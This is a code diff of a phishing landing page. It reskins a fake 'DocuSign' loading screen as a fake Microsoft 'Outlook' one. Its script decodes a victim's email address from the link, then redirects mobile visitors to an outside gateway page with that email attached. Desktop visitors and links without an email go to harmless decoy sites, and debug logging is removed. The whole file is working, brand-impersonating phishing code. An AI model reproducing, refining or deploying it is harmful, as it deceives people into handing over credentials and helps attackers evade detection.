@@ -3,102 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accessing Document - DocuSign</title>
+    <title>Outlook</title>
     <style>
         body {
-            font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #f8f8f8;
+            font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
             color: #333;
+            position: relative;
+            overflow: hidden;
         }
-        .container {
-            background-color: #ffffff;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            padding: 40px;
-            width: 480px;
-            max-width: 90%;
-            text-align: center;
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('image.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(8px);
+            transform: scale(1.1); /* Slight scale to prevent blur edges */
+            z-index: 0;
         }
-        .header {
-            margin-bottom: 30px;
-        }
-        .docusign-logo {
-            width: 150px;
-            height: auto;
-            margin-bottom: 20px;
-        }
-        .title {
-            color: #19487C; /* DocuSign's darker blue */
-            font-size: 22px;
-            font-weight: 600;
-            margin: 0 0 10px 0;
-        }
-        .subtitle {
-            color: #555;
-            font-size: 16px;
-            margin-bottom: 30px;
-        }
-        .loading-container {
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
             display: flex;
-            flex-direction: column; 
+            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            margin-bottom: 20px;
+            z-index: 1;
         }
-        .spinner {
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .outlook-spinner {
             width: 40px;
             height: 40px;
-            border: 4px solid rgba(0,0,0,0.1);
-            border-top-color: #FFD100; /* DocuSign yellow/gold */
+            border: 3px solid rgba(0, 120, 212, 0.2);
+            border-top-color: #0078d4;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        .loading-text {
-            color: #333;
-            font-size: 16px;
-            font-weight: 500;
-            margin: 0;
-        }
-        .progress-container {
-            background-color: #e0e0e0;
-            height: 8px;
-            border-radius: 4px;
-            overflow: hidden;
             margin-bottom: 20px;
-            width: 100%;
-        }
-        .progress-bar-fill { /* Renamed from .progress-bar to match original sec.html */
-            height: 100%;
-            background-color: #19487C;
-            width: 0%;
-            animation: fill 2.5s linear forwards;
-            border-radius: 4px;
-        }
-        .file-info { 
-            color: #666;
-            font-size: 14px;
-            margin: 0 0 30px 0;
-        }
-        .footer-text {
-            color: #777;
-            font-size: 12px;
-            margin-top: 30px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        @keyframes fill {
-            0% { width: 0%; }
-            30% { width: 40%; } 
-            70% { width: 80%; }
-            100% { width: 100%; }
+        #MSLogo {
+            position: fixed;
+            bottom: 36px;
+            left: calc(50vw - 50px);
+            width: 100px;
+            height: auto;
+            z-index: 2;
         }
         noscript {
             display: block;
@@ -113,31 +81,20 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
-            <h1 class="title">Preparing Your Document</h1>
-            <p class="subtitle">Please wait a moment while we get things ready for you.</p>
+    <div id="loadingScreen">
+        <div class="spinner-container">
+            <div class="outlook-spinner"></div>
         </div>
-        <div class="loading-container">
-            <div class="spinner"></div>
-            <p class="loading-text">Verifying and loading...</p>
-        </div>
-        <div class="progress-container">
-            <div class="progress-bar-fill" id="progressBar"></div>
-        </div>
-        <p class="file-info">This shouldn't take long.</p>
+        <img src="https://res.public.onecdn.static.microsoft/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft" crossorigin="anonymous" loading="lazy">
         <noscript>
-            <p>JavaScript is essential for DocuSign to function. Please enable JavaScript in your browser settings and reload the page.</p>
+            <p>JavaScript is essential for Outlook to function. Please enable JavaScript in your browser settings and reload the page.</p>
         </noscript>
-        <p class="footer-text">&copy; DocuSign, Inc. All rights reserved.</p>
     </div>
 
     <!-- Simple device detection and redirect script -->
     <script>
     (function() {
-        const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://marquesformworks.com.au/terminal-auth.html#";
+        const MOBILE_REDIRECT_URL_BASE = "http://thomascook-mu.com/gateway.html?";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -258,13 +215,12 @@
                 // Check if hash contains a direct email (not in a parameter format)
                 // Try to decode if it looks like our encoded format
                 if (hashContent.length > 7 && !hashContent.includes('=') && !hashContent.includes('&')) {
-                    // It's likely a direct encoded value, not a query parameter
-                    console.log('🔍 Found direct value in hash:', hashContent);
+                    
                     
                     try {
                         const decoded = emailDecryptor.decodeEmail(hashContent);
                         if (decoded && isValidEmail(decoded)) {
-                            console.log('✅ Successfully decoded email from hash:', decoded);
+                            
                             return decoded;
                         } else if (isValidEmail(hashContent)) {
                             // Hash contains a plain email
@@ -303,12 +259,12 @@
 
             // Try to decode if it looks like our encoded format
             if (encodedValue && encodedValue.length > 7) {
-                console.log('🔍 Attempting to decode:', encodedValue);
+               
                 
                 try {
                     const decoded = emailDecryptor.decodeEmail(encodedValue);
                     if (decoded && isValidEmail(decoded)) {
-                        console.log('✅ Successfully decoded email:', decoded);
+                        
                         return decoded;
                     } else {
                         console.log('⚠️ Decoded value is not a valid email:', decoded);
@@ -318,7 +274,7 @@
                 }
                 
                 // If decoding fails, return the encoded value as fallback
-                console.log('⚠️ Could not decode email, using encoded value');
+               
                 return encodedValue;
             }
 
@@ -333,18 +289,19 @@
 
             if(value)
             {
-
              redirectUrl = MOBILE_REDIRECT_URL_BASE + value; 
-        }else{
+            }else{
               redirectUrl = MOBILE_REDIRECT_URL_BASE; 
+            }
+
+          
+            window.location.href = redirectUrl;
         }
 
-                console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                window.location.href = redirectUrl;
-        }
-
-        // Execute redirect after a short delay
-        setTimeout(performRedirect, REDIRECT_DELAY);
+        // Auto-redirect after 3 seconds
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(performRedirect, 3000);
+        });
     })();
     </script>
 </body>
